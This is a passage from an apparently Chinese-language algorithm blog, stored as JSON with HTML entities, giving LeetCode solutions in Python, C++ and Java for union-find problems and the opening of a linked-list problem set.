容易想到，可以根据这个规则将同行或者同列的删除得剩下一个石头。比如下面的，由于同行同列可以删除，最优的做法就是删除得剩下一个。 1231 0 0 10 1 0 00 1 0 1 这就又是并查集的思路了：每个连通子图都可以剩下一个，那么答案就是总共的石头数目-连通子图的个数。 所以对于x, y坐标就是把横纵坐标合并为一个子图。由于x, y &lt; 10^4，因此可以将y的坐标加上10001来区分x, y坐标。 1234567891011121314151617181920212223class Solution: def removeStones(self, stones: List[List[int]]) -&gt; int: fa = &#123;&#125; for (x, y) in stones: root_x = self.find(fa, x) root_y = self.find(fa, y + 10001) if root_x != root_y: fa[root_y] = root_x cnt = 0 for x, root_x in fa.items(): if x == root_x: cnt += 1 return len(stones) - cnt def find(self, fa, x): if x not in fa: fa[x] = x return x if x == fa[x]: return fa[x] fa[x] = self.find(fa, fa[x]) return fa[x] 959. 由斜杠划分区域 在由 1 x 1 方格组成的 N x N 网格 grid 中，每个 1 x 1 方块由 /、\\ 或空格构成。这些字符会将方块划分为一些共边的区域。 （请注意，反斜杠字符是转义的，因此 \\ 用 \"\\\\\" 表示。）。 返回区域的数目。 示例 1： 1234567&gt;输入：&gt;[ &quot; &#x2F;&quot;, &quot;&#x2F; &quot;&gt;]&gt;输出：2&gt;解释：2x2 网格如下： 示例 2： 1234567&gt;输入：&gt;[ &quot; &#x2F;&quot;, &quot; &quot;&gt;]&gt;输出：1&gt;解释：2x2 网格如下： 示例 3： 12345678&gt;输入：&gt;[ &quot;\\\\&#x2F;&quot;, &quot;&#x2F;\\\\&quot;&gt;]&gt;输出：4&gt;解释：（回想一下，因为 \\ 字符是转义的，所以 &quot;\\\\&#x2F;&quot; 表示 \\&#x2F;，而 &quot;&#x2F;\\\\&quot; 表示 &#x2F;\\。）&gt;2x2 网格如下： 示例 4： 12345678&gt;输入：&gt;[ &quot;&#x2F;\\\\&quot;, &quot;\\\\&#x2F;&quot;&gt;]&gt;输出：5&gt;解释：（回想一下，因为 \\ 字符是转义的，所以 &quot;&#x2F;\\\\&quot; 表示 &#x2F;\\，而 &quot;\\\\&#x2F;&quot; 表示 \\&#x2F;。）&gt;2x2 网格如下： 示例 5： 1234567&gt;输入：&gt;[ &quot;&#x2F;&#x2F;&quot;, &quot;&#x2F; &quot;&gt;]&gt;输出：3&gt;解释：2x2 网格如下： 提示： 1 &lt;= grid.length == grid[0].length &lt;= 30 grid[i][j] 是 '/'、'\\'、或 ' '。 这题很容易想到并查集，但是难的是建图，可以把一个位置分成如下四个小区域，若当前字符为： 空格：则合并4个区域 /： 合并03, 12 \\: 合并 01, 23 image.png 图片来自https://leetcode-cn.com/problems/regions-cut-by-slashes/solution/you-xie-gang-hua-fen-qu-yu-by-leetcode-67xb/ 那么不同块直接处理呢？注意到当前位置的“1”和右边的“3”肯定是能连接的，不管是什么符号。而当前位置的“2”和下面的\"0\"也是一定能连接的，因此直接合并即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution: def regionsBySlashes(self, grid: List[str]) -&gt; int: n = len(grid) uf = UnionFind(4 * n * n) for i in range(n): for j in range(n): c = grid[i][j] start = self.pos(i, j, n) if c == &#x27; &#x27;: uf.union(start, start + 1) uf.union(start, start + 2) uf.union(start, start + 3) elif c == &#x27;/&#x27;: uf.union(start, start + 3) uf.union(start + 1, start + 2) else: #\\ uf.union(start, start + 1) uf.union(start + 2, start + 3) if j + 1 &lt; n: right_start = self.pos(i, j + 1, n) uf.union(start + 1, right_start + 3) if i + 1 &lt; n: down_start = self.pos(i + 1, j, n) uf.union(start + 2, down_start) return uf.get_root_count() def pos(self, i, j, n): return i * 4 * n + j * 4class UnionFind: def __init__(self, n): self.fa = [i for i in range(n)] self.count = n def get_root_count(self,): return self.count def find(self, x): if x != self.fa[x]: self.fa[x] = self.find(self.fa[x]) return self.fa[x] def union(self, x, y): root_x = self.find(x) root_y = self.find(y) if root_x != root_y: self.fa[root_y] = root_x self.count -= 1 1202. 交换字符串中的元素 给你一个字符串 s，以及该字符串中的一些「索引对」数组 pairs，其中 pairs[i] = [a, b] 表示字符串中的两个索引（编号从 0 开始）。 你可以 任意多次交换 在 pairs 中任意一对索引处的字符。 返回在经过若干次交换后，s 可以变成的按字典序最小的字符串。 示例 1: 12345&gt;输入：s &#x3D; &quot;dcab&quot;, pairs &#x3D; [[0,3],[1,2]]&gt;输出：&quot;bacd&quot;&gt;解释： &gt;交换 s[0] 和 s[3], s &#x3D; &quot;bcad&quot;&gt;交换 s[1] 和 s[2], s &#x3D; &quot;bacd&quot; 示例 2： 123456&gt;输入：s &#x3D; &quot;dcab&quot;, pairs &#x3D; [[0,3],[1,2],[0,2]]&gt;输出：&quot;abcd&quot;&gt;解释：&gt;交换 s[0] 和 s[3], s &#x3D; &quot;bcad&quot;&gt;交换 s[0] 和 s[2], s &#x3D; &quot;acbd&quot;&gt;交换 s[1] 和 s[2], s &#x3D; &quot;abcd&quot; 示例 3： 123456&gt;输入：s &#x3D; &quot;cba&quot;, pairs &#x3D; [[0,1],[1,2]]&gt;输出：&quot;abc&quot;&gt;解释：&gt;交换 s[0] 和 s[1], s &#x3D; &quot;bca&quot;&gt;交换 s[1] 和 s[2], s &#x3D; &quot;bac&quot;&gt;交换 s[0] 和 s[1], s &#x3D; &quot;abc&quot; 提示： 1 &lt;= s.length &lt;= 10^5 0 &lt;= pairs.length &lt;= 10^5 0 &lt;= pairs[i][0], pairs[i][1] &lt; s.length s 中只含有小写英文字母 这题有一个pairs数组，可以任意多次交换，容易想到的是，[0, 3]能交换，[3, 6]能交换，那么[0, 6]也能交换（具有传递性）。 因此可以用一个并查集，来找到所有的连通分量，对于同一组连通分量的，进行排序，然后按大小输出即可。 注意这里由于只有小写字母，因此可以用计数排序。 123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123;public: string smallestStringWithSwaps(string s, vector&lt;vector&lt;int&gt;&gt;&amp; pairs) &#123; vector&lt;int&gt; fa(s.size(), 0); for (std::size_t i = 0; i &lt; s.size(); ++i) &#123; fa[i] = i; &#125; for (auto&amp; pair : pairs) &#123; int root_x = find(pair[0], fa); int root_y = find(pair[1], fa); fa[root_y] = root_x; &#125; unordered_map&lt;int, vector&lt;int&gt;&gt; counter; for (std::size_t i = 0; i &lt; s.size(); ++i) &#123; int root = find(i, fa); if (counter.find(root) == counter.end()) &#123; counter[root] = vector(26, 0); &#125; ++counter[root][s[i] - &#x27;a&#x27;]; &#125; stringstream ss; for (std::size_t i = 0; i &lt; s.size(); ++i) &#123; int root = find(i, fa); vector&lt;int&gt;&amp; cnt = counter[root]; for (std::size_t j = 0; j &lt; 26; ++j) &#123; if (cnt[j] &gt; 0) &#123; --cnt[j]; ss &lt;&lt; char(&#x27;a&#x27; + j); break; &#125; &#125; &#125; return ss.str(); &#125; int find(int cur, vector&lt;int&gt;&amp; fa) &#123; return cur == fa[cur]? cur : fa[cur] = find(fa[cur], fa); &#125;&#125;; 1319. 连通网络的操作次数 用以太网线缆将 n 台计算机连接成一个网络，计算机的编号从 0 到 n-1。线缆用 connections 表示，其中 connections[i] = [a, b] 连接了计算机 a 和 b。 网络中的任何一台计算机都可以通过网络直接或者间接访问同一个网络中其他任意一台计算机。 给你这个计算机网络的初始布线 connections，你可以拔开任意两台直连计算机之间的线缆，并用它连接一对未直连的计算机。请你计算并返回使所有计算机都连通所需的最少操作次数。如果不可能，则返回 -1 。 示例 1： 123&gt;输入：n &#x3D; 4, connections &#x3D; [[0,1],[0,2],[1,2]]&gt;输出：1&gt;解释：拔下计算机 1 和 2 之间的线缆，并将它插到计算机 1 和 3 上。 示例 2： 12&gt;输入：n &#x3D; 6, connections &#x3D; [[0,1],[0,2],[0,3],[1,2],[1,3]]&gt;输出：2 示例 3： 123&gt;输入：n &#x3D; 6, connections &#x3D; [[0,1],[0,2],[0,3],[1,2]]&gt;输出：-1&gt;解释：线缆数量不足。 示例 4： 12&gt;输入：n &#x3D; 5, connections &#x3D; [[0,1],[0,2],[3,4],[2,3]]&gt;输出：0 提示： 1 &lt;= n &lt;= 10^5 1 &lt;= connections.length &lt;= min(n*(n-1)/2, 10^5) connections[i].length == 2 0 &lt;= connections[i][0], connections[i][1] &lt; n connections[i][0] != connections[i][1] 没有重复的连接。 两台计算机不会通过多条线缆连接。 将两个线断开，然后去连接没有连接的计算机，相当于连接两个连通分量。因为断开的线必然是不影响原来连通分量的连通性的，否则就不能断开。 因此可以用并查集，首先将所有节点合并，看有几个连通分量，只需要将多余的线断开并连接即可。因此答案为连通分量数 - 1 注意无解的情况就是本身的线少于n - 1条的情况。 1234567891011121314151617181920212223242526class Solution: def makeConnected(self, n: int, connections: List[List[int]]) -&gt; int: if len(connections) &lt; n - 1: return -1 uf = UnionFind(n) for a, b in connections: uf.union(a, b) root_nodes = uf.get_root_nodes() return len(root_nodes) - 1class UnionFind: def __init__(self, n): self.fa = [i for i in range(n)] def get_root_nodes(self,): return [i for i in range(len(self.fa)) if i == self.fa[i]] def find(self, x): if x != self.fa[x]: self.fa[x] = self.find(self.fa[x]) return self.fa[x] def union(self, x, y): root_x = self.find(x) root_y = self.find(y) if root_x != root_y: self.fa[root_y] = root_x 1489. 找到最小生成树里的关键边和伪关键边 给你一个 n 个点的带权无向连通图，节点编号为 0 到 n-1 ，同时还有一个数组 edges ，其中 edges[i] = [from``i, toi, weighti] 表示在 fromi 和 toi 节点之间有一条带权无向边。最小生成树 (MST) 是给定图中边的一个子集，它连接了所有节点且没有环，而且这些边的权值和最小。 请你找到给定图中最小生成树的所有关键边和伪关键边。如果从图中删去某条边，会导致最小生成树的权值和增加，那么我们就说它是一条关键边。伪关键边则是可能会出现在某些最小生成树中但不会出现在所有最小生成树中的边。 请注意，你可以分别以任意顺序返回关键边的下标和伪关键边的下标。 示例 1： img 1234567&gt;输入：n &#x3D; 5, edges &#x3D; [[0,1,1],[1,2,1],[2,3,2],[0,3,2],[0,4,3],[3,4,3],[1,4,6]]&gt;输出：[[0,1],[2,3,4,5]]&gt;解释：上图描述了给定图。&gt;下图是所有的最小生成树。&gt;注意到第 0 条边和第 1 条边出现在了所有最小生成树中，所以它们是关键边，我们将这两个下标作为输出的第一个列表。&gt;边 2，3，4 和 5 是所有 MST 的剩余边，所以它们是伪关键边。我们将它们作为输出的第二个列表。 示例 2 ： img 123&gt;输入：n &#x3D; 4, edges &#x3D; [[0,1,1],[1,2,1],[2,3,1],[0,3,1]]&gt;输出：[[],[0,1,2,3]]&gt;解释：可以观察到 4 条边都有相同的权值，任选它们中的 3 条可以形成一棵 MST 。所以 4 条边都是伪关键边。 提示： 2 &lt;= n &lt;= 100 1 &lt;= edges.length &lt;= min(200, n * (n - 1) / 2) edges[i].length == 3 0 &lt;= fromi &lt; toi &lt; n 1 &lt;= weighti &lt;= 1000 所有 (fromi, toi) 数对都是互不相同的。 首先用kruskal算法生成最小生成树，然后枚举MST的每一条边mst_i： 初始化一个新的并查集，将除了mst_i外的所有边都合并 遍历edges，若能找不到边能生成MST或者两个连通分量的权值会增加，则说明是关键边，否则为伪关建边 注意由于一开始将数组排序的，所以最后还要将排好序的数组和一开始的数组下标对应 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class Solution: def findCriticalAndPseudoCriticalEdges(self, n: int, edges: List[List[int]]) -&gt; List[List[int]]: edges = [(i, x, y, w) for i, (x, y, w) in enumerate(edges)] edges.sort(key=lambda x: x[-1]) uf = UnionFind(n) mst_edge_index = [] mst_weight = 0 for i, (_, x, y, w) in enumerate(edges): root_x = uf.find(x) root_y = uf.find(y) if root_x != root_y: mst_weight += w mst_edge_index.append(i) uf.union(root_x, root_y) if len(mst_edge_index) &gt;= n - 1: break key_list = [] fake_key_list = [] if len(mst_edge_index) != n - 1: return [key_list, fake_key_list] for mst_i in mst_edge_index: temp_uf = UnionFind(n) temp_w = 0 for i in mst_edge_index: if mst_i == i: continue _, x, y, w = edges[i] temp_uf.union(x, y) temp_w += w find_equal = False find_two_graph_edge = False for i in range(mst_i + 1, len(edges)): # 从mst_i + 1 开始 _, x, y, w = edges[i] root_x = temp_uf.find(x) root_y = temp_uf.find(y) if root_x == root_y: continue find_two_graph_edge = True if temp_w + w == mst_weight: find_equal = True fake_key_list.append(i) elif temp_w + w &gt; mst_weight: break if not find_two_graph_edge or not find_equal: key_list.append(mst_i) else: fake_key_list.append(mst_i) key_list = [edges[i][0] for i in key_list] fake_key_list = [edges[i][0] for i in set(fake_key_list)] return [key_list, fake_key_list]class UnionFind: def __init__(self, n): self.fa = [i for i in range(n)] def find(self, x): if x != self.fa[x]: self.fa[x] = self.find(self.fa[x]) return self.fa[x] def union(self, x, y): root_x = self.find(x) root_y = self.find(y) if root_x != root_y: self.fa[root_y] = root_x 1631. 最小体力消耗路径 你准备参加一场远足活动。给你一个二维 rows x columns 的地图 heights ，其中 heights[row][col] 表示格子 (row, col) 的高度。一开始你在最左上角的格子 (0, 0) ，且你希望去最右下角的格子 (rows-1, columns-1) （注意下标从 0 开始编号）。你每次可以往 上，下，左，右 四个方向之一移动，你想要找到耗费 体力 最小的一条路径。 一条路径耗费的 体力值 是路径上相邻格子之间 高度差绝对值 的 最大值 决定的。 请你返回从左上角走到右下角的最小 体力消耗值 。 示例 1： img 1234&gt;输入：heights &#x3D; [[1,2,2],[3,8,2],[5,3,5]]&gt;输出：2&gt;解释：路径 [1,3,5,3,5] 连续格子的差值绝对值最大为 2 。&gt;这条路径比路径 [1,2,2,2,5] 更优，因为另一条路径差值最大值为 3 。 示例 2： img 123&gt;输入：heights &#x3D; [[1,2,3],[3,8,4],[5,3,5]]&gt;输出：1&gt;解释：路径 [1,2,3,4,5] 的相邻格子差值绝对值最大为 1 ，比路径 [1,3,5,3,5] 更优。 示例 3： img 123&gt;输入：heights &#x3D; [[1,2,1,1,1],[1,2,1,2,1],[1,2,1,2,1],[1,2,1,2,1],[1,1,1,2,1]]&gt;输出：0&gt;解释：上图所示路径不需要消耗任何体力。 提示： rows == heights.length columns == heights[i].length 1 &lt;= rows, columns &lt;= 100 1 &lt;= heights[i][j] &lt;= 106 方法1. 最短路径 用最短路径的算法如dijkstra 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849struct Node &#123; int x; int y; int cost; Node(int x, int y, int cost) : x(x), y(y), cost(cost) &#123;&#125; bool operator &lt; (const Node&amp; o) const &#123; return cost &gt; o.cost; &#125;&#125;;class Solution &#123;public: int minimumEffortPath(vector&lt;vector&lt;int&gt;&gt;&amp; heights) &#123; if (heights.empty()) return 0; const int m = heights.size(); const int n = heights[0].size(); vector&lt;vector&lt;bool&gt;&gt; vis(m, vector&lt;bool&gt;(n, false)); vector&lt;vector&lt;int&gt;&gt; dis(m, vector&lt;int&gt;(n, INT_MAX)); priority_queue&lt;Node&gt; q; q.push(Node(0, 0, 0)); int dx[] = &#123;1, -1, 0, 0&#125;; int dy[] = &#123;0, 0, 1, -1&#125;; while (!q.empty()) &#123; Node cur = q.top(); q.pop(); if (vis[cur.x][cur.y]) &#123; continue; &#125; if (cur.x == m - 1 &amp;&amp; cur.y == n - 1) &#123; return cur.cost; &#125; vis[cur.x][cur.y] = true; for (int i = 0; i &lt; 4; ++i) &#123; int nx = cur.x + dx[i]; int ny = cur.y + dy[i]; if (nx &lt; 0 || ny &lt; 0 || nx &gt;= m || ny &gt;= n || vis[nx][ny]) &#123; continue; &#125; int temp = abs(heights[nx][ny] - heights[cur.x][cur.y]); temp = max(temp, cur.cost); if (temp &lt; dis[nx][ny]) &#123; dis[nx][ny] = temp; q.push(Node(nx, ny, temp)); &#125; &#125; &#125; return -1; &#125;&#125;; 方法2.二分搜索 设答案为mid，然后遍历图，每次只能遍历权重差不大于mid的点。 如果能到达右下角，则设right = mid缩小范围，否则left = mid + 1增大权重 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution &#123;public: int minimumEffortPath(vector&lt;vector&lt;int&gt;&gt;&amp; heights) &#123; if (heights.empty()) return 0; const int m = heights.size(); const int n = heights[0].size(); int dx[] = &#123;1, -1, 0, 0&#125;; int dy[] = &#123;0, 0, 1, -1&#125;; int left = 0, right = 1e6 + 1; while (left &lt; right) &#123; int mid = left + ((right - left) &gt;&gt; 1); queue&lt;pair&lt;int, int&gt;&gt; q; vector&lt;vector&lt;bool&gt;&gt; vis(m, vector&lt;bool&gt;(n, false)); q.emplace(0, 0); vis[0][0] = true; while (!q.empty()) &#123; auto [x, y] = q.front(); q.pop(); if (x == m - 1 &amp;&amp; y == n - 1) &#123; break; &#125; for (int i = 0; i &lt; 4; ++i) &#123; int nx = x + dx[i]; int ny = y + dy[i]; if (nx &lt; 0 || ny &lt; 0 || nx &gt;= m || ny &gt;= n || vis[nx][ny]) &#123; continue; &#125; if (abs(heights[nx][ny] - heights[x][y]) &lt;= mid) &#123; q.emplace(nx, ny); vis[nx][ny] = true; &#125; &#125; &#125; if (vis[m - 1][n - 1]) &#123; right = mid; &#125; else &#123; left = mid + 1; &#125; &#125; return left; &#125;&#125;; 方法3. 并查集 将一个点和它右边、下方两个点边的权值（就是相减的绝对值）放入列表中，按权值从小到大排序。 从小到大遍历边，用并查集合并两个点，若合并后起点和终点连通，则说明找到了答案。PS：需要注意只有一个点的情况， 返回0。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class UnionFind &#123;public: UnionFind(int n) &#123; _fa.resize(n); for (int i = 0; i &lt; n; ++i) &#123; _fa[i] = i; &#125; &#125; int find(int x) &#123; return x == _fa[x] ? x : _fa[x] = find(_fa[x]); &#125; void union_fa(int x, int y) &#123; int root_x = find(x); int root_y = find(y); if (root_x != root_y) &#123; _fa[root_y] = root_x; &#125; &#125;private: vector&lt;int&gt; _fa;&#125;;class Solution &#123;public: int minimumEffortPath(vector&lt;vector&lt;int&gt;&gt;&amp; heights) &#123; if (heights.empty()) return 0; const int m = heights.size(); const int n = heights[0].size(); vector&lt;tuple&lt;int, int, int&gt;&gt; values; values.reserve(m * n); for (int i = 0; i &lt; m; ++i) &#123; for (int j = 0; j &lt; n; ++j) &#123; if (i + 1 != m) &#123; values.emplace_back(abs(heights[i][j] - heights[i + 1][j]), i * n + j, (i + 1) * n + j); &#125; if (j + 1 != n) &#123; values.emplace_back(abs(heights[i][j] - heights[i][j + 1]), i * n + j, i * n + j + 1); &#125; &#125; &#125; sort(values.begin(), values.end()); UnionFind uf(m * n); for (auto [w, key1, key2] : values) &#123; uf.union_fa(key1, key2); if (uf.find(0) == uf.find(m * n - 1)) &#123; return w; &#125; &#125; return 0; &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode 链表","slug":"leetcode-linklist","date":"2015-06-22T14:02:50.000Z","updated":"2021-01-08T13:32:16.853Z","comments":true,"path":"leetcode-linklist/","link":"","permalink":"https://www.hrwhisper.me/leetcode-linklist/","excerpt":"本次题解包括： 依照leetcode定义 自己写的链表创建/打印方法，便于测试 2. Add Two Numbers 19 . Remove Nth Node From End of List 21. Merge Two Sorted Lists 23. Merge k Sorted Lists 24. Swap Nodes in Pairs 25. Reverse Nodes in k-Group 61. Rotate List 86. Partition List 138 . Copy List with Random Pointer 141 . Linked List Cycle 142. Linked List Cycle II 143 . Reorder List 147. Insertion Sort List 148. Sort List 160. Intersection of Two Linked Lists 203 . Remove Linked List Elements 206 . Reverse Linked List 234 . Palindrome Linked List 237 . Delete Node in a Linked List 817. Linked List Components update:2015-7-14 add a 203 solution code: using recursion and reference to delete linklist node which value equals x 单项链表递归删除，使用引用","text":"本次题解包括： 依照leetcode定义 自己写的链表创建/打印方法，便于测试 2. Add Two Numbers 19 . Remove Nth Node From End of List 21. Merge Two Sorted Lists 23. Merge k Sorted Lists 24. Swap Nodes in Pairs 25. Reverse Nodes in k-Group 61. Rotate List 86. Partition List 138 . Copy List with Random Pointer 141 . Linked List Cycle 142. Linked List Cycle II 143 . Reorder List 147. Insertion Sort List 148. Sort List 160. Intersection of Two Linked Lists 203 . Remove Linked List Elements 206 . Reverse Linked List 234 . Palindrome Linked List 237 . Delete Node in a Linked List 817. Linked List Components update:2015-7-14 add a 203 solution code: using recursion and reference to delete linklist node which value equals x 单项链表递归删除，使用引用 update:2015-06-23 update some codes ,more simple and cool than before. solve problems 203 and 206 一、链表构建 C 12345678910111213141516171819202122struct ListNode * createLinklist(int *a, int n)&#123; if (n &lt;= 0) return NULL; struct ListNode *head = (struct ListNode*) malloc(sizeof(struct ListNode)), *p = head, *q; head-&gt;val = a[0]; head-&gt;next = NULL; for (int i = 1; i &lt; n; i++)&#123; q = (struct ListNode*) malloc(sizeof(struct ListNode)); q-&gt;next = NULL; //怀念c++默认构造函数。。。 q-&gt;val = a[i]; p-&gt;next = q; p = q; &#125; return head;&#125;void printLinklist(struct ListNode * head)&#123; for (; head; head = head-&gt;next) printf(&quot;%d &quot;, head-&gt;val); puts(&quot;&quot;);&#125; C++ 123456789101112131415161718192021222324struct ListNode &#123; int val; ListNode *next; ListNode(int x) : val(x), next(NULL) &#123;&#125;&#125;;ListNode * createLinklist(int *a, int n)&#123; if (n &lt;= 0) return NULL; ListNode * head = new ListNode(a[0]), *p = head, *q; for (int i = 1; i &lt; n; i++)&#123; q = new ListNode(a[i]); p-&gt;next = q; p = q; &#125; return head;&#125;void printLinklist(ListNode * head)&#123; for (; head; head = head-&gt;next) printf(&quot;%d &quot;, head-&gt;val); puts(&quot;&quot;);&#125; Python 1234567891011121314151617class ListNode: def __init__(self, x): self.val = x self.next = Nonedef creatList(vals): head=ListNode(-1) p=head for i in vals: q=ListNode(i) p.next , p = q, q return head.nextdef printList(head): while head: print head.val head=head.next 二、题解 2. Add Two Numbers You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list. You may assume the two numbers do not contain any leading zero, except the number 0 itself. Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4) Output: 7 -&gt; 0 -&gt; 8 题目地址：leetcode Add Two Numbers 题目大意: 给定两个非空链表，链表已经是逆序，求他们的和。 思路: 利用哨兵节点代码更好写，直接加即可。 C++ 12345678910111213141516171819202122232425262728293031class Solution &#123;public: ListNode * addTwoNumbers(ListNode* l1, ListNode* l2) &#123; if (!l1) return l2; if (!l2) return l1; ListNode head(-1), *p = &amp;head, *q = nullptr; int carry = 0; while (l1 || l2) &#123; int t = carry; if (l2) &#123; t += l2-&gt;val; l2 = l2-&gt;next; &#125; if (l1) &#123; t += l1-&gt;val; l1 = l1-&gt;next; &#125; q = new ListNode(t &lt; 10 ? t : t - 10); carry = t &gt;= 10 ? 1 : 0; p-&gt;next = q; p = q; &#125; if (carry) &#123; q = new ListNode(carry); p-&gt;next = q; &#125; p = head.next; return p; &#125;&#125;; Java 1234567891011121314151617181920212223242526class Solution &#123; public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode head = new ListNode(-1), p = head, q; int carry = 0; while (l1 != null l2 != null) &#123; int t = carry; if (l1 != null) &#123; t += l1.val; l1 = l1.next; &#125; if (l2 != null) &#123; t += l2.val; l2 = l2.next; &#125; q = new ListNode(t &gt;= 10 ? t - 10 : t); carry = t &gt;= 10 ? 1 : 0; p.next = q; p = q; &#125; if (carry != 0) &#123; q = new ListNode(carry); p.next = q; &#125; return head.next; &#125;&#125; Python 12345678910111213141516171819202122232425class Solution(object): def addTwoNumbers(self, l1, l2): &quot;&quot;&quot; :type l1: ListNode :type l2: ListNode :rtype: ListNode &quot;&quot;&quot; head = p = q = ListNode(-1) carry = 0 while l1 or l2: t = carry if l1: t += l1.val l1 = l1.next if l2: t += l2.val l2 = l2.next q = ListNode(t if t &lt; 10 else t - 10) carry = 1 if t &gt;= 10 else 0 p.next = q p = q if carry: q = ListNode(carry) p.next = q return head.next 19. leetcode Remove Nth Node From End of List Given a linked list, remove the _n_th node from the end of list and return its head. For example, 12345Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n &#x3D; 2.After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5. Note: Given n will always be valid. Try to do this in one pass. 题目地址：leetcode Remove Nth Node From End of List 思路： 如果可以求出链表的长度，那么很简单： 12345678910111213141516171819202122232425class Solution &#123;public: ListNode* removeNthFromEnd(ListNode* head, int n) &#123; int len = 0; ListNode *p = head , *t; while (p) &#123; len++; p = p-&gt;next; &#125; int cnt = 0,target = len - n; if (!target) &#123; t = head; head = head-&gt;next; &#125; else&#123; p = head; for (int i = 1; i &lt; len - n; i++) p = p-&gt;next; t = p-&gt;next; p-&gt;next = t? t-&gt;next:NULL; &#125; delete t; return head; &#125;&#125;; 但是如果要求只遍历一次呢，我们就不能求长度了，可以用两个指针，一个指针faster先遍历n个节点，然后在一起遍历到faster-&gt;next为空的时候。 12345678910111213141516171819202122class Solution &#123;public: ListNode* removeNthFromEnd(ListNode* head, int n) &#123; ListNode *p = head, *q = head; for(int i = 0; i &lt; n; ++i) q = q-&gt;next; if(!q)&#123; q = head; head = head-&gt;next; &#125; else&#123; while(q-&gt;next)&#123; p = p-&gt;next; q = q-&gt;next; &#125; q = p-&gt;next; p-&gt;next = q-&gt;next; &#125; delete q; return head; &#125;&#125;; Python 123456789101112131415161718class Solution(object): def removeNthFromEnd(self, head, n): &quot;&quot;&quot; :type head: ListNode :type n: int :rtype: ListNode &quot;&quot;&quot; p = q = head for i in range(n): q = q.next if not q: return head.next while q.next: p = p.next q = q.next p.next = p.next.next return head 21. leetcode Merge Two Sorted Lists Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists. 题目地址：leetcode Merge Two Sorted Lists 题目大意：合并两个已经排好序的链表。 类似归并排序，直接合并即可。 C++: 123456789101112131415161718192021class Solution &#123;public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123; ListNode t(-1), *head = &amp;t; ListNode *p = head; while (l1 &amp;&amp; l2) &#123; if (l1-&gt;val &lt;= l2-&gt;val) &#123; p-&gt;next = l1; l1 = l1-&gt;next; &#125; else &#123; p-&gt;next = l2; l2 = l2-&gt;next; &#125; p = p-&gt;next; &#125; p-&gt;next = l1 ? l1 : l2; p = head-&gt;next; return p; &#125;&#125;; Python 123456789101112131415161718class Solution(object): def mergeTwoLists(self, l1, l2): &quot;&quot;&quot; :type l1: ListNode :type l2: ListNode :rtype: ListNode &quot;&quot;&quot; head = p = ListNode(-1) while l1 and l2: if l1.val &lt; l2.val: p.next = l1 l1 = l1.next else: p.next = l2 l2 = l2.next p = p.next p.next = l1 if l1 else l2 return head.next 23. Merge k Sorted Lists Merge k sorted linked lists and return it as one sorted list. Analyze and describe its complexity. 题目地址：leetcode Merge k Sorted Lists 题目大意：给定k个排好序的链表，合并成一个有序的 思路： 用堆来合并。复杂度O(Nlogk) N为最终合并完的链表的长度。 C++ 123456789101112131415161718192021222324252627struct ListNodeCompare&#123; bool operator() (ListNode* a, ListNode *b)&#123; return a-&gt;val &gt; b-&gt;val; &#125;&#125;;class Solution &#123;public: ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123; priority_queue&lt;ListNode*, vector&lt;ListNode*&gt;, ListNodeCompare&gt; q; for(ListNode* head: lists) if(head) q.push(head); ListNode head(-1), *p = &amp;head; while(!q.empty())&#123; ListNode* cur = q.top(); q.pop(); p-&gt;next = cur; p = cur; if(cur-&gt;next)&#123; q.push(cur-&gt;next); cur-&gt;next = nullptr; &#125; &#125; return head.next; &#125;&#125;; 当然也可以新建一个类来做比较 123456789101112131415161718192021222324252627struct MergeNode&#123; ListNode *head; MergeNode(ListNode *p): head(p)&#123;&#125; bool operator &lt;(const MergeNode &amp;b) const&#123; return head-&gt;val &gt; b.head-&gt;val; &#125;&#125;;class Solution &#123;public: ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123; ListNode dummy(-1), *p = &amp;dummy; priority_queue&lt;MergeNode&gt; q; for(ListNode *t: lists) if(t) q.push(MergeNode(t)); while(!q.empty())&#123; MergeNode cur = q.top(); q.pop(); p-&gt;next = cur.head; cur.head = cur.head-&gt;next; p = p-&gt;next; p-&gt;next = nullptr; if(cur.head) q.push(cur); &#125; return dummy.next; &#125;&#125;; Python 123456789101112131415161718192021222324252627282930class MergeNode(object): def __init__(self, head): self.head = head def __lt__(self, other): return self.head.val &lt; other.head.val; class Solution(object): def mergeKLists(self, lists): &quot;&quot;&quot; :type lists: List[ListNode] :rtype: ListNode &quot;&quot;&quot; q = [] for t in lists: if t: q.append(MergeNode(t)) heapq.heapify(q) p = dummy = ListNode(-1) while q: cur = heapq.heappop(q) p.next = cur.head cur.head = cur.head.next p = p.next p.next = None if cur.head: heapq.heappush(q, cur) return dummy.next 24. Swap Nodes in Pairs Given a linked list, swap every two adjacent nodes and return its head. For example, Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed. 题目地址：leetcode Swap Nodes in Pairs 题目大意：交换链表中相邻两个元素 思路：直接交换即可。。。 C++ 123456789101112131415class Solution &#123;public: ListNode* swapPairs(ListNode* head) &#123; ListNode dummy(-1), *p = &amp;dummy; p-&gt;next = head; while(p-&gt;next &amp;&amp; p-&gt;next-&gt;next)&#123; ListNode *a = p-&gt;next, *b = a-&gt;next; p-&gt;next = b; a-&gt;next = b-&gt;next; b-&gt;next = a; p = a; &#125; return dummy.next; &#125;&#125;; Python 123456789101112131415class Solution(object): def swapPairs(self, head): 